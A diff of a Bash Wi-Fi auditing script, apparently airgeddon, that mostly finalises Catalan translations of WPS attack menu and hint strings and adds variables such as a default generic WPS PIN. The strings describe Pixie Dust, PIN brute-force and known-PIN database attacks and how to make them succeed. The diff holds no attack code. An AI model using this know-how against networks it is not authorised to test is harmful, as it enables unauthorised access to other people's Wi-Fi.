@@ -112,6 +112,9 @@ minimum_bully_pixiewps_version="1.1"
 minimum_bully_verbosity4_version="1.1"
 known_pins_dbfile="known_pins.db"
 pins_dbfile_checksum="pindb_checksum.txt"
+wps_default_generic_pin="12345670"
+wps_attack_script_file="ag.wpsattack.sh"
+wps_out_file="ag.wpsout.txt"
 
 #Repository and contact vars
 github_user="v1s1t0r1sh3r3"
@@ -195,7 +198,7 @@ declare select_interface_hints=(246)
 declare language_hints=(250)
 declare evil_twin_hints=(254 258 264 269 309 328)
 declare evil_twin_dos_hints=(267 268)
-declare wps_hints=(342 343 344 356 369)
+declare wps_hints=(342 343 344 356 369 390)
 
 #Charset vars
 crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
@@ -213,6 +216,7 @@ cyan_color="\033[1;36m"
 brown_color="\033[0;33m"
 yellow_color="\033[1;33m"
 pink_color="\033[1;35m"
+white_color="\e[1;97m"
 normal_color="\e[1;0m"
 
 #Set different language text strings
@@ -3152,7 +3156,7 @@ function language_strings() {
 	arr["ENGLISH",333]="8.  WPS attacks menu"
 	arr["SPANISH",333]="8.  Menú de ataques WPS"
 	arr["FRENCH",333]="8.  Menu d'attaques WPS"
-	arr["CATALAN",333]="${pending_of_translation} 8.  Menú d'atacs WPS"
+	arr["CATALAN",333]="8.  Menú d'atacs WPS"
 	arr["PORTUGUESE",333]="8.  Menu de ataques WPS"
 	arr["RUSSIAN",333]="8.  Меню атак на WPS"
 	arr["GREEK",333]="8.  Μενού επιθέσεων WPS"
@@ -3160,7 +3164,7 @@ function language_strings() {
 	arr["ENGLISH",334]="WPS attacks menu"
 	arr["SPANISH",334]="Menú de ataques WPS"
 	arr["FRENCH",334]="Menu d'attaques WPS"
-	arr["CATALAN",334]="${pending_of_translation} Menú d'atacs WPS"
+	arr["CATALAN",334]="Menú d'atacs WPS"
 	arr["PORTUGUESE",334]="Menu de ataques WPS"
 	arr["RUSSIAN",334]="Меню атак на WPS"
 	arr["GREEK",334]="Μενού επιθέσεων WPS"
@@ -3168,7 +3172,7 @@ function language_strings() {
 	arr["ENGLISH",335]="Selected WPS BSSID: ${pink_color}${wps_bssid}${normal_color}"
 	arr["SPANISH",335]="BSSID WPS seleccionado: ${pink_color}${wps_bssid}${normal_color}"
 	arr["FRENCH",335]="BSSID WPS sélectionné: ${pink_color}${wps_bssid}${normal_color}"
-	arr["CATALAN",335]="${pending_of_translation} BSSID WPS seleccionat: ${pink_color}${wps_bssid}${normal_color}"
+	arr["CATALAN",335]="BSSID WPS seleccionat: ${pink_color}${wps_bssid}${normal_color}"
 	arr["PORTUGUESE",335]="BSSID WPS selecionado: ${pink_color}${wps_bssid}${normal_color}"
 	arr["RUSSIAN",335]="Выбран WPS BSSID: ${pink_color}${wps_bssid}${normal_color}"
 	arr["GREEK",335]="Επιλεγμένο WPS BSSID: ${pink_color}${wps_bssid}${normal_color}"
@@ -3176,7 +3180,7 @@ function language_strings() {
 	arr["ENGLISH",336]="Selected WPS channel: ${pink_color}${wps_channel}${normal_color}"
 	arr["SPANISH",336]="Canal WPS seleccionado: ${pink_color}${wps_channel}${normal_color}"
 	arr["FRENCH",336]="Canal WPS sélectionné: ${pink_color}${wps_channel}${normal_color}"
-	arr["CATALAN",336]="${pending_of_translation} Canal WPS seleecionat: ${pink_color}${wps_channel}${normal_color}"
+	arr["CATALAN",336]="Canal WPS seleccionat: ${pink_color}${wps_channel}${normal_color}"
 	arr["PORTUGUESE",336]="Canal WPS selecionado: ${pink_color}${wps_channel}${normal_color}"
 	arr["RUSSIAN",336]="Выбран WPS канал: ${pink_color}${wps_channel}${normal_color}"
 	arr["GREEK",336]="Επιλεγμένο WPS κανάλι: ${pink_color}${wps_channel}${normal_color}"
@@ -3184,7 +3188,7 @@ function language_strings() {
 	arr["ENGLISH",337]="Selected WPS ESSID: ${pink_color}${wps_essid}${blue_color} <- can't be used"
 	arr["SPANISH",337]="ESSID WPS seleccionado: ${pink_color}${wps_essid}${blue_color} <- no se puede usar"
 	arr["FRENCH",337]="ESSID WPS sélectionné: ${pink_color}${wps_essid}${blue_color} <- ne peut pas être utilisé"
-	arr["CATALAN",337]="${pending_of_translation} ESSID WPS seleccionat: ${pink_color}${wps_essid}${blue_color} <- no es pot utilitzar"
+	arr["CATALAN",337]="ESSID WPS seleccionat: ${pink_color}${wps_essid}${blue_color} <- no es pot utilitzar"
 	arr["PORTUGUESE",337]="ESSID WPS selecionado: ${pink_color}${wps_essid}${blue_color} <- não pode ser utilizada"
 	arr["RUSSIAN",337]="Выбран WPS ESSID: ${pink_color}${wps_essid}${blue_color} <- не может использоваться"
 	arr["GREEK",337]="Επιλεγμένο WPS ESSID: ${pink_color}${wps_essid}${blue_color} <- δεν μπορεί να χρησιμοποιηθεί"
@@ -3192,7 +3196,7 @@ function language_strings() {
 	arr["ENGLISH",338]="Selected WPS ESSID: ${pink_color}${wps_essid}${normal_color}"
 	arr["SPANISH",338]="ESSID WPS seleccionado: ${pink_color}${wps_essid}${normal_color}"
 	arr["FRENCH",338]="ESSID WPS sélectionné: ${pink_color}${wps_essid}${normal_color}"
-	arr["CATALAN",338]="${pending_of_translation} ESSID WPS seleccionat: ${pink_color}${wps_essid}${normal_color}"
+	arr["CATALAN",338]="ESSID WPS seleccionat: ${pink_color}${wps_essid}${normal_color}"
 	arr["PORTUGUESE",338]="ESSID WPS selecionado: ${pink_color}${wps_essid}${normal_color}"
 	arr["RUSSIAN",338]="Выбран WPS ESSID: ${pink_color}${wps_essid}${normal_color}"
 	arr["GREEK",338]="Επιλεγμένο WPS ESSID: ${pink_color}${wps_essid}${normal_color}"
@@ -3200,7 +3204,7 @@ function language_strings() {
 	arr["ENGLISH",339]="Selected WPS BSSID: ${pink_color}None${normal_color}"
 	arr["SPANISH",339]="BSSID WPS seleccionado: ${pink_color}Ninguno${normal_color}"
 	arr["FRENCH",339]="BSSID WPS sélectionné: ${pink_color}Aucun${normal_color}"
-	arr["CATALAN",339]="${pending_of_translation} BSSID WPS seleccionat: ${pink_color}Ningú${normal_color}"
+	arr["CATALAN",339]="BSSID WPS seleccionat: ${pink_color}Ningú${normal_color}"
 	arr["PORTUGUESE",339]="BSSID WPS selecionado: ${pink_color}Nenhum${normal_color}"
 	arr["RUSSIAN",339]="Выбран WPS BSSID: ${pink_color}Нет${normal_color}"
 	arr["GREEK",339]="Επιλεγμένο WPS BSSID: ${pink_color}Κανένα${normal_color}"
@@ -3208,7 +3212,7 @@ function language_strings() {
 	arr["ENGLISH",340]="Selected WPS channel: ${pink_color}None${normal_color}"
 	arr["SPANISH",340]="Canal WPS seleccionado: ${pink_color}Ninguno${normal_color}"
 	arr["FRENCH",340]="Canal WPS sélectionné: ${pink_color}Aucun${normal_color}"
-	arr["CATALAN",340]="${pending_of_translation} Canal WPS seleccionat: ${pink_color}Ningú${normal_color}"
+	arr["CATALAN",340]="Canal WPS seleccionat: ${pink_color}Ningú${normal_color}"
 	arr["PORTUGUESE",340]="Canal WPS selecionado: ${pink_color}Nenhum${normal_color}"
 	arr["RUSSIAN",340]="Выбран WPS канал: ${pink_color}Нет${normal_color}"
 	arr["GREEK",340]="Επιλεγμένο WPS κανάλι: ${pink_color}Κανένα${normal_color}"
@@ -3216,7 +3220,7 @@ function language_strings() {
 	arr["ENGLISH",341]="Selected WPS ESSID: ${pink_color}None${normal_color}"
 	arr["SPANISH",341]="ESSID WPS seleccionado: ${pink_color}Ninguno${normal_color}"
 	arr["FRENCH",341]="ESSID WPS sélectionné: ${pink_color}Aucun${normal_color}"
-	arr["CATALAN",341]="${pending_of_translation} ESSID WPS seleccionat: ${pink_color}Ningú${normal_color}"
+	arr["CATALAN",341]="ESSID WPS seleccionat: ${pink_color}Ningú${normal_color}"
 	arr["PORTUGUESE",341]="ESSID WPS selecionado: ${pink_color}Nenhum${normal_color}"
 	arr["RUSSIAN",341]="Выбран WPS ESSID: ${pink_color}Нет${normal_color}"
 	arr["GREEK",341]="Επιλεγμένο WPS ESSID: ${pink_color}Κανένα${normal_color}"
@@ -3224,7 +3228,7 @@ function language_strings() {
 	arr["ENGLISH",342]="Pixie Dust attack obtains PIN and password in seconds, but not all access points are affected"
 	arr["SPANISH",342]="El ataque Pixie Dust obtiene el PIN y la clave en segundos, pero no todos los puntos de acceso son vulnerables a este ataque"
 	arr["FRENCH",342]="L'attaque Pixie Dust permet l'obtention du PIN et du mot de passe en quelques secondes mais les points d'accès ne sont pas tous vulnérables"
-	arr["CATALAN",342]="${pending_of_translation} L'atac Pixie Dust obté el PIN i la clau en segons, però no tots els punts d'accés són vulnerables a aquest atac"
+	arr["CATALAN",342]="L'atac Pixie Dust obté el PIN i la clau en segons, però no tots els punts d'accés són vulnerables a aquest atac"
 	arr["PORTUGUESE",342]="O ataque Pixie Dust recebe o PIN e senha em segundos, mas nem todos os pontos de acesso são vulneráveis a este ataque"
 	arr["RUSSIAN",342]="Pixie Dust получает PIN и пароль за секунды, но не все точки доступа подвержены этой атаке"
 	arr["GREEK",342]="Η επίθεση Pixie Dust αποκτά το PIN και τον κωδικό πρόσβασης σε δευτερόλεπτα, αλλά μερικά σημεία πρόσβασης δεν επηρεάζονται"
@@ -3232,7 +3236,7 @@ function language_strings() {
 	arr["ENGLISH",343]="In order to success on any WPS based attack, you need good signal of target network. We might otherwise get false negatives"
 	arr["SPANISH",343]="Para realizar cualquier ataque WPS es necesario tener una buena señal de la red objetivo. Si no, podríamos obtener falsos negativos"
 	arr["FRENCH",343]="Il faut être dans de bonnes conditions d'émission et de réception pour pouvoir mener à bien une attaque WPS. Sinon l'attaque pourrait se solder par un faux négatif"
-	arr["CATALAN",343]="${pending_of_translation} Per realitzar qualsevol atac WPS cal tenir un bon senyal de la xarxa objectiu. Si no, podríem obtenir falsos negatius"
+	arr["CATALAN",343]="Per realitzar qualsevol atac WPS cal tenir un bon senyal de la xarxa objectiu. Si no, podríem obtenir falsos negatius"
 	arr["PORTUGUESE",343]="Para executar qualquer ataque WPS você precisa ter um bom sinal da rede alvo. Caso contrario você pode obter falsos negativos"
 	arr["RUSSIAN",343]="Чтобы добиться успеха при любой WPS атаке, вам нужен хорошей сигнал целевой сети. В противном случае мы можем получить ложные срабатывания"
 	arr["GREEK",343]="Για να εκτελεστεί επιτυχώς οποιαδήποτε επίθεση WPS, θα πρέπει να υπάρχει ισχυρό σήμα του δικτύου στόχου. Αλλιώς μπορεί να υπάρξουν ψευδώς αρνητικά αποτελέσματα"
@@ -3240,7 +3244,7 @@ function language_strings() {
 	arr["ENGLISH",344]="Some access points can be blocked after failing some PIN connection attempts. It may vary depending on the access point"
 	arr["SPANISH",344]="Algunos puntos de acceso se bloquean tras fallar cierto número de intentos de conexión por PIN. Puede variar dependiendo del punto de acceso"
 	arr["FRENCH",344]="Certains routeurs bloquent le WPS après un certain nombre de PIN erronés. Ce nombre varie selon les modèle"
-	arr["CATALAN",344]="${pending_of_translation} Alguns punts d'accés es bloqueja després de fallar cert nombre d'intents de connexió per PIN. Pot variar depenent del punt d'accés"
+	arr["CATALAN",344]="Alguns punts d'accés es bloquejan després de fallar un cert nombre d'intents de connexió per PIN. Pot variar depenent del punt d'accés"
 	arr["PORTUGUESE",344]="Alguns pontos de acesso podem estar bloqueados depois de receber uma série de tentativas incorretas de conexão por PIN. Isso pode variar dependendo do ponto de acesso"
 	arr["RUSSIAN",344]="Некоторые точки доступа блокируются после нескольких неудачных попыток подключения с PIN. Это зависит от конкретной точки доступа."
 	arr["GREEK",344]="Μερικά σημεία πρόσβασης μπορεί να μπλοκαριστούν μετά από μερικές αποτυχημένες προσπάθειες σύνδεσης PIN. Μπορεί να διαφέρει ανάλογα με το σημείο πρόσβασης"
@@ -3248,7 +3252,7 @@ function language_strings() {
 	arr["ENGLISH",345]="5.  (bully) Custom PIN association"
 	arr["SPANISH",345]="5.  (bully) Asociación con PIN personalizado"
 	arr["FRENCH",345]="5.  (bully) Association avec PIN personnalisé"
-	arr["CATALAN",345]="${pending_of_translation} 5.  (bully) Associació amb PIN personalitzat"
+	arr["CATALAN",345]="5.  (bully) Associació amb PIN personalitzat"
 	arr["PORTUGUESE",345]="5.  (bully) Associação com o PIN personalizado"
 	arr["RUSSIAN",345]="5.  (bully) Ассоциация с персонализированным PIN"
 	arr["GREEK",345]="5.  (bully) Σύνδεση με εξατομικευμένο PIN"
@@ -3256,7 +3260,7 @@ function language_strings() {
 	arr["ENGLISH",346]="7.  (bully) Pixie Dust attack"
 	arr["SPANISH",346]="7.  (bully) Ataque Pixie Dust"
 	arr["FRENCH",346]="7.  (bully) Attaque Pixie Dust"
-	arr["CATALAN",346]="${pending_of_translation} 7.  (bully) Atac Pixie Dust"
+	arr["CATALAN",346]="7.  (bully) Atac Pixie Dust"
 	arr["PORTUGUESE",346]="7.  (bully) Ataque Pixie Dust"
 	arr["RUSSIAN",346]="7.  (bully) Атака Pixie Dust"
 	arr["GREEK",346]="7.  (bully) Επίθεση Pixie Dust"
@@ -3264,7 +3268,7 @@ function language_strings() {
 	arr["ENGLISH",347]="9.  (bully) Bruteforce PIN attack"
 	arr["SPANISH",347]="9.  (bully) Ataque de fuerza bruta por PIN"
 	arr["FRENCH",347]="9.  (bully) Attaque brute force PIN"
-	arr["CATALAN",347]="${pending_of_translation} 9.  (bully) Atac de força bruta per PIN"
+	arr["CATALAN",347]="9.  (bully) Atac de força bruta per PIN"
 	arr["PORTUGUESE",347]="9.  (bully) Ataque de força bruta por PIN"
 	arr["RUSSIAN",347]="9.  (bully) Атака перебором PIN"
 	arr["GREEK",347]="9.  (bully) Επίθεση PIN με χρήση ωμής βίας"
@@ -3272,7 +3276,7 @@ function language_strings() {
 	arr["ENGLISH",348]="11. (bully) Known PINs database based attack"
 	arr["SPANISH",348]="11. (bully) Ataque basado en base de datos de PINs conocidos"
 	arr["FRENCH",348]=" 11. (bully) Attaque en utilisant un PIN de la base de données"
-	arr["CATALAN",348]="${pending_of_translation} 11. (bully) Atac basat en base de dades de PINs coneguts"
+	arr["CATALAN",348]="11. (bully) Atac basat en base de dades de PINs coneguts"
 	arr["PORTUGUESE",348]="11. (bully) Ataque com base em banco de dados de PINs conhecidos"
 	arr["RUSSIAN",348]="11. (bully) Атака на основе базы данных известных PIN"
 	arr["GREEK",348]="11. (bully) Επίθεση με χρήση γνωστής βάσης δεδομένων PIN"
@@ -3288,7 +3292,7 @@ function language_strings() {
 	arr["ENGLISH",350]="${blue_color}You have selected a locked WPS network ${green_color}Do you want to continue? ${normal_color}[y/n]"
 	arr["SPANISH",350]="${blue_color}Has seleccionado una red WPS bloqueada ${green_color}¿Deseas continuar? ${normal_color}[y/n]"
 	arr["FRENCH",350]="${blue_color}Vous avez sélectionné un réseau dont le WPS est bloqué ${green_color}Voulez-vous continuer? ${normal_color}[y/n]"
-	arr["CATALAN",350]="${pending_of_translation} ${blue_color}Has seleccionat una xarxa WPS bloquejada ${green_color}¿Vols continuar? ${normal_color}[y/n]"
+	arr["CATALAN",350]="${blue_color}Has seleccionat una xarxa WPS bloquejada ${green_color}¿Vols continuar? ${normal_color}[y/n]"
 	arr["PORTUGUESE",350]="${blue_color}Você selecionou uma rede com WPS bloqueado ${green_color}Você deseja continuar? ${normal_color}[y/n]"
 	arr["RUSSIAN",350]="${blue_color}Вы выбрали заблокированную WPS сеть ${green_color}Вы хотите продолжить? ${normal_color}[y/n]"
 	arr["GREEK",350]="${blue_color}Έχετε επιλέξει ένα κλειδωμένο WPS δίκτυο ${green_color}Θέλετε να συνεχίσετε; ${normal_color}[y/n]"
@@ -3296,7 +3300,7 @@ function language_strings() {
 	arr["ENGLISH",351]="WPS locked network: ${pink_color}${wps_locked}${normal_color}"
 	arr["SPANISH",351]="Red WPS bloqueada: ${pink_color}${wps_locked}${normal_color}"
 	arr["FRENCH",351]="Blocage du WPS: ${pink_color}${wps_locked}${normal_color}"
-	arr["CATALAN",351]="${pending_of_translation} Xarxa WPS bloquejada: ${pink_color}${wps_locked}${normal_color}"
+	arr["CATALAN",351]="Xarxa WPS bloquejada: ${pink_color}${wps_locked}${normal_color}"
 	arr["PORTUGUESE",351]="Rede com WPS bloqueado: ${pink_color}${wps_locked}${normal_color}"
 	arr["RUSSIAN",351]="Сеть с заблокированным WPS: ${pink_color}${wps_locked}${normal_color}"
 	arr["GREEK",351]="Κλειδωμένο WPS δίκτυο: ${pink_color}${wps_locked}${normal_color}"
@@ -3304,7 +3308,7 @@ function language_strings() {
 	arr["ENGLISH",352]="WPS locked network: ${pink_color}None${normal_color}"
 	arr["SPANISH",352]="Red WPS bloqueada: ${pink_color}Ninguno${normal_color}"
 	arr["FRENCH",352]="Blocage du WPS: ${pink_color}Aucun${normal_color}"
-	arr["CATALAN",352]="${pending_of_translation} Xarxa WPS bloquejada: ${pink_color}Ningú${normal_color}"
+	arr["CATALAN",352]="Xarxa WPS bloquejada: ${pink_color}Ningú${normal_color}"
 	arr["PORTUGUESE",352]="rede com WPS bloqueado: ${pink_color}Nenhum${normal_color}"
 	arr["RUSSIAN",352]="Сеть с заблокированным WPS: ${pink_color}Нет${normal_color}"
 	arr["GREEK",352]="Κλειδωμένο WPS δίκτυο: ${pink_color}Κανένα${normal_color}"
@@ -3312,7 +3316,7 @@ function language_strings() {
 	arr["ENGLISH",353]="Checking to solve possible \"bad FCS\" problem if exists. Parameterizing..."
 	arr["SPANISH",353]="Realizando una pequeña prueba para solventar el posible problema de \"bad FCS\" si existiese. Parametrizando..."
 	arr["FRENCH",353]="Vérification de routine pour prévenir une éventuelle erreur de type \"bad FCS\""
-	arr["CATALAN",353]="${pending_of_translation} Mitjançant una petita prova per solucionar el possible problema de \"bad FCS\" si existís. Parametritzant..."
+	arr["CATALAN",353]="Realitzant una petita prova per solucionar el possible problema de \"bad FCS\" si existís. Parametritzant..."
 	arr["PORTUGUESE",353]="Fazendo alguns teste para resolver o possível problema \"bad FCS\". Definindo parâmetro..."
 	arr["RUSSIAN",353]="Проверка возможного решения проблемы \"плохого FCS (контроля последовательности кадров)\" если она существует. Параметризация..."
 	arr["GREEK",353]="Γίνεται έλεγχος επίλυσης πιθανού σφάλματος \"bad FCS\" αν υπάρχει. Γίνεται παραμετροποίηση..."
@@ -3320,7 +3324,7 @@ function language_strings() {
 	arr["ENGLISH",354]="Done! parameter set"
 	arr["SPANISH",354]="Hecho! parámetro fijado"
 	arr["FRENCH",354]="Paramètres définis!"
-	arr["CATALAN",354]="${pending_of_translation} Fet! paràmetre fixat"
+	arr["CATALAN",354]="Fet! paràmetre fixat"
 	arr["PORTUGUESE",354]="Feito! parâmetro definido"
 	arr["RUSSIAN",354]="Сделано! параметры заданы"
 	arr["GREEK",354]="Έγινε! η παράμετρος τέθηκε"
@@ -3328,7 +3332,7 @@ function language_strings() {
 	arr["ENGLISH",355]="It seems this interface was parametrized before. It's not necessary to check again"
 	arr["SPANISH",355]="Esta interfaz ya fue parametrizada anteriormente. No es necesario realizar de nuevo el chequeo"
 	arr["FRENCH",355]="Cette interface a déjà été configurée: Pas besoin de vérifier de nouevau son état"
-	arr["CATALAN",355]="${pending_of_translation} Aquesta interfície ja va ser parametritzada anteriorment. No cal fer de nou la revisió"
+	arr["CATALAN",355]="Sembla que aquesta interfície va ser parametritzada abans. No cal verificar-ho de nou"
 	arr["PORTUGUESE",355]="Esta interface já foi configurada anteriormente. Não é necessário verificar novamente"
 	arr["RUSSIAN",355]="Кажется, этот интерфейс был параметризован ранее. Нет необходимости проверять снова"
 	arr["GREEK",355]="Φαίνεται πως αυτή η διεπαφή παραμετροποιήθηκε προηγουμένως. Δεν είναι απαραίτητο να γίνει έλεγχος ξανά"
@@ -3336,7 +3340,7 @@ function language_strings() {
 	arr["ENGLISH",356]="Some combinations don't work well. Such as reaver and Ralink chipset cards. If your card has this chipset is recommended to use bully"
 	arr["SPANISH",356]="Algunas combinaciones no funcionan bien. Como por ejemplo reaver y las tarjetas con chipset Ralink. Si tu tarjeta tiene este chipset es mejor utilizar bully"
 	arr["FRENCH",356]="Il existe certains problèmes spécifiques de compatibilité. L’exemple le plus marquant est sans aucun doute celui des chipsets Ralink qui ne fonctionnent pas bien avec reaver. Il est donc conseillé d'utiliser bully avec ces chipsets"
-	arr["CATALAN",356]="${pending_of_translation} Algunes combinacions no funcionan bé. Com per exemple reaver i les targetes amb chipset Ralink. Si la teva targeta té aquest chipset és millor utilitzar bully"
+	arr["CATALAN",356]="Algunes combinacions no funcionan bé. Com per exemple Reaver i les targetes amb chipset Ralink. Si la teva targeta té aquest chipset és millor utilitzar bully"
 	arr["PORTUGUESE",356]="Algumas combinações não funcionam bem. Tais como reaver e placas de rede com chipset Ralink. Se o sua placa de rede tem este chipset é melhor usar bully"
 	arr["RUSSIAN",356]="Некоторые комбинации не работают нормально. К примеру reaver и карты с чипсетом Ralink. Если ваша карта имеет этот чипсет, то рекомендуется использовать bully"
 	arr["GREEK",356]="Μερικοί συνδυασμοί δεν λειτουργούν καλά. Όπως για παράδειγμα το reaver με κάρτες που έχουν Ralink chipset. Αν η κάρτα σας έχει αυτό το chipset είναι προτιμότερο να χρησιμοποιήσετε το bully"
@@ -3344,7 +3348,7 @@ function language_strings() {
 	arr["ENGLISH",357]="6.  (reaver) Custom PIN association"
 	arr["SPANISH",357]="6.  (reaver) Asociación con PIN personalizado"
 	arr["FRENCH",357]="6.  (reaver) Association avec le code PIN personnalisé"
-	arr["CATALAN",357]="${pending_of_translation} 6.  (reaver) Associació amb PIN personalitzat"
+	arr["CATALAN",357]="6.  (reaver) Associació amb PIN personalitzat"
 	arr["PORTUGUESE",357]="6.  (reaver) Associação com o PIN personalizado"
 	arr["RUSSIAN",357]="6.  (reaver) Пользовательские PIN ассоциации"
 	arr["GREEK",357]="6.  (reaver) Σύνδεση με εξατομικευμένο PIN"
@@ -3352,7 +3356,7 @@ function language_strings() {
 	arr["ENGLISH",358]="8.  (reaver) Pixie Dust attack"
 	arr["SPANISH",358]="8.  (reaver) Ataque Pixie Dust"
 	arr["FRENCH",358]="8.  (reaver) Attaque Pixie Dust"
-	arr["CATALAN",358]="${pending_of_translation} 8.  (reaver) Atac Pixie Dust"
+	arr["CATALAN",358]="8.  (reaver) Atac Pixie Dust"
 	arr["PORTUGUESE",358]="8.  (reaver) Ataque Pixie Dust"
 	arr["RUSSIAN",358]="8.  (reaver) Атака Pixie Dust"
 	arr["GREEK",358]="8.  (reaver) Επίθεση Pixie Dust"
@@ -3360,7 +3364,7 @@ function language_strings() {
 	arr["ENGLISH",359]="10. (reaver) Bruteforce PIN attack"
 	arr["SPANISH",359]="10. (reaver) Ataque de fuerza bruta por PIN"
 	arr["FRENCH",359]="10. (reaver) Attaque de force brute PIN"
-	arr["CATALAN",359]="${pending_of_translation} 10. (reaver) Atac de força bruta per PIN"
+	arr["CATALAN",359]="10. (reaver) Atac de força bruta per PIN"
 	arr["PORTUGUESE",359]="10. (reaver) Ataque de força bruta por PIN"
 	arr["RUSSIAN",359]="10. (reaver) Атака перебором PIN"
 	arr["GREEK",359]="10. (reaver) Επίθεση PIN με χρήση ωμής βίας"
@@ -3368,7 +3372,7 @@ function language_strings() {
 	arr["ENGLISH",360]="12. (reaver) Known PINs database based attack"
 	arr["SPANISH",360]="12. (reaver) Ataque basado en base de datos de PINs conocidos"
 	arr["FRENCH",360]="12. (reaver) Attaque en utilisant la base de données de PIN connus"
-	arr["CATALAN",360]="${pending_of_translation} 12. (reaver) Atac basat en base de dades de PINs coneguts"
+	arr["CATALAN",360]="12. (reaver) Atac basat en base de dades de PINs coneguts"
 	arr["PORTUGUESE",360]="12. (reaver) Ataque com base em banco de dados de PINs conhecidos"
 	arr["RUSSIAN",360]="12. (reaver) Атака на основе базы данных известных PIN"
 	arr["GREEK",360]="12. (reaver) Επίθεση με χρήση γνωστής βάσης δεδομένων PIN"
@@ -3384,7 +3388,7 @@ function language_strings() {
 	arr["ENGLISH",362]="Custom PIN set to ${normal_color}${custom_pin}"
 	arr["SPANISH",362]="PIN personalizado elegido ${normal_color}${custom_pin}"
 	arr["FRENCH",362]="PIN personnalisé définit ${normal_color}${custom_pin}"
-	arr["CATALAN",362]="${pending_of_translation} PIN personalitzat triat ${normal_color}${custom_pin}"
+	arr["CATALAN",362]="PIN personalitzat triat ${normal_color}${custom_pin}"
 	arr["PORTUGUESE",362]="PIN personalizado escolhido ${normal_color}${custom_pin}"
 	arr["RUSSIAN",362]="Пользовательский PIN установлен на ${normal_color}${custom_pin}"
 	arr["GREEK",362]="Το εξατομικευμένο PIN τέθηκε σε ${normal_color}${custom_pin}"
@@ -3392,7 +3396,7 @@ function language_strings() {
 	arr["ENGLISH",363]="Type custom PIN :"
 	arr["SPANISH",363]="Escribe el PIN personalizado :"
 	arr["FRENCH",363]="Rentrez PIN personnalisé :"
-	arr["CATALAN",363]="${pending_of_translation} Escriu el PIN personalitzat :"
+	arr["CATALAN",363]="Escriu el PIN personalitzat :"
 	arr["PORTUGUESE",363]="Escreva o ESSID do alvo :"
 	arr["RUSSIAN",363]="Напишите пользовательский PIN :"
 	arr["GREEK",363]="Πληκτρολογήστε εξατομικευμένο PIN :"
@@ -3416,7 +3420,7 @@ function language_strings() {
 	arr["ENGLISH",366]="After stopping the attack (using [Ctrl+C]), the window will not be closed automatically. So you'll have time to write down the password if successful. You'll have to close it manually"
 	arr["SPANISH",366]="Tras parar el ataque (usando [Ctrl+C]), la ventana del ataque no se cerrará automáticamente. Asi tendrás tiempo de anotar la contraseña en caso de tener éxito. Tendrás que cerrarla manualmente"
 	arr["FRENCH",366]="Après l'arrêt de l'attaque (en utilisant [Ctrl+C]), la fenêtre ne se ferme pas automatiquement. Afin de vous laisser le temps d'écrire le mot de passe en cas de succès. Vous devrez la fermer manuellement"
-	arr["CATALAN",366]="${pending_of_translation} Després parar l'atac (usant [Ctrl+C]), la finestra de l'atac no es tancarà automàticament. Així tindràs temps d'anotar la contrasenya en cas de tenir èxit. Hauràs de tancar-la manualment"
+	arr["CATALAN",366]="Després de parar l'atac (usant [Ctrl+C]), la finestra de l'atac no es tancarà automàticament. Així tindràs temps d'anotar la contrasenya en cas de tenir èxit. Hauràs de tancar-la manualment"
 	arr["PORTUGUESE",366]="Depois de parar o ataque (usando [Ctrl+C]), a janela não será fechada automaticamente. Então temos tempo para anotar a senha em caso ela tenha sido obtida. Em seguida você vai ter que fechar a janela manualmente"
 	arr["RUSSIAN",366]="После остановки атаки (используя [Ctrl+C]), окно автоматически не закроется. У вас будет время переписать пароль, если атака завершилась успешно. Затем вам нужно закрыть его вручную"
 	arr["GREEK",366]="Μετά τη διακοπή της επίθεσης (με [Ctrl+C]), το παράθυρο δεν θα κλείσει αυτόματα. Έτσι θα έχετε χρόνο να κρατήσετε τον κωδικό πρόσβασης σε περίπτωση επιτυχίας. Το παράθυρο θα πρέπει να το κλείσετε χειροκίνητα"
@@ -3424,7 +3428,7 @@ function language_strings() {
 	arr["ENGLISH",367]="You have bully installed (v${bully_version}), but not required version. To perform Pixie Dust integrated bully attack you must have at least version v${minimum_bully_pixiewps_version}"
 	arr["SPANISH",367]="Tienes bully instalado (v${bully_version}), aunque no la versión requerida. Para realizar el ataque Pixie Dust integrado con bully has de tener al menos la versión v${minimum_bully_pixiewps_version}"
 	arr["FRENCH",367]="Bully est installé (v${bully_version}) mais ce n'est pas la bonne version. Vous devez avoir au moins la version v${minimum_bully_pixiewps_version} pour la compatibilité pixie dust"
-	arr["CATALAN",367]="${pending_of_translation} Tens bully instal·lat (v${bully_version}), encara que no la versió requerida. Per realitzar l'atac Pixie Dust integrat amb bully has de tenir almenys la versió v${minimum_bully_pixiewps_version}"
+	arr["CATALAN",367]="Tens bully instal·lat (v${bully_version}), encara que no és la versió requerida. Per realitzar l'atac Pixie Dust integrat amb bully has de tenir almenys la versió v${minimum_bully_pixiewps_version}"
 	arr["PORTUGUESE",367]="Você tem o bully instalado (v${bully_version}), mas não a versão necessária. Para fazer o ataque Pixie Dust com bully você precisa ter pelo menos a versão v${minimum_bully_pixiewps_version}"
 	arr["RUSSIAN",367]="У вас установлен bully (v${bully_version}), но не та версия, которая требуется. Для выполнения интегрированной в bully атаки Pixie Dust у вас должна быть по крайне мере версия v${minimum_bully_pixiewps_version}"
 	arr["GREEK",367]="Έχετε εγκατεστημένο το bully (v${bully_version}), αλλά όχι την απαιτούμενη έκδοση. Για να κάνετε την επίθεση Pixie Dust με ενσωματωμένο bully θα πρέπει να έχετε τουλάχιστον την έκδοση v${minimum_bully_pixiewps_version}"
@@ -3432,7 +3436,7 @@ function language_strings() {
 	arr["ENGLISH",368]="You have bully installed (v${bully_version}). You meet the version requirement to perform Pixie Dust integrated bully attack (minimum version v${minimum_bully_pixiewps_version}). Script can continue..."
 	arr["SPANISH",368]="Tienes bully instalado (v${bully_version}). Cumples con el requisito de versión para realizar el ataque Pixie Dust integrado con bully (versión mínima v${minimum_bully_pixiewps_version}). El script puede continuar..."
 	arr["FRENCH",368]="Bully est installé (v${bully_version}). Cette version est compatible avec l'attaque pixie dust (version minimale v${minimum_bully_pixiewps_version}). Le script peut continuer..."
-	arr["CATALAN",368]="${pending_of_translation} Tens bully instal·lat (v${bully_version}). Compleixes amb el requisit de versió per a realitzar l'atac Pixie Dust integrat amb bully (versió mínima v${minimum_bully_pixiewps_version}). El script pot continuar..."
+	arr["CATALAN",368]="Tens bully instal·lat (v${bully_version}). Compleixes amb el requisit de versió per realitzar l'atac Pixie Dust integrat amb bully (versió mínima v${minimum_bully_pixiewps_version}). El script pot continuar..."
 	arr["PORTUGUESE",368]="Você tem o bully instalado (v${bully_version}). Você cumpre a exigência de versão para o ataque Pixie Dust com bully (versão mínima v${minimum_bully_pixiewps_version}). O script pode continuar..."
